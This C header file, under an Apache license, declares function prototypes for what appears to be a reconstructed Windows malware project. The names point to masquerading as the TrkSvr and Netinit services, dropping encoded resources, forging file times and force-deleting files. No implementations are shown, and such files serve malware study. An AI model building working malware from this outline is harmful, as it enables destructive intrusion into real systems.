/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "Global\Global.h"

DWORD GetRandom();

WCHAR *strcpyW(WCHAR *a1, const WCHAR *a2, ...);
char *strset(char *a1, char a2, int a3);
UINT32 strlenW(const WCHAR *string);
bool strcmpW(WCHAR *a1, WCHAR *a2);
char *btowc(char *a1, WCHAR *a2, int a3);// bytes to wchar

DWORD GetProcessID(WCHAR *process_name);
DWORD SearchProcessByIdOrName(DWORD process_id, WCHAR *process_name);

void ResetArgs();
int DeleteJobAfter95Seconds(JOB_PROPERTIES *lpAddress);
bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *a2);
bool ForceFileDeletion(LPCWSTR file_to_delete);
void DeleteServiceExecutables();
int _Wow64DisableWow64FsRedirection(PVOID *OldValue);
int _Wow64RevertWow64FsRedirection(PVOID OlValue);
bool Is32Bit();
bool IsLeapYear(signed int year);
int GetDaysInMonth(signed int year, int month);
bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len);
bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path);
bool GetTrksrvServiceInfo(WCHAR *svc_filename, WCHAR *svc_path);
bool GetNetinitServiceInfo(WCHAR *svc_name, WCHAR *svc_path);
bool GeneralSetup();
bool IsFileAccessible(LPCWSTR lpFileName);
bool SetReliableFileTime(LPCWSTR lpFileName);
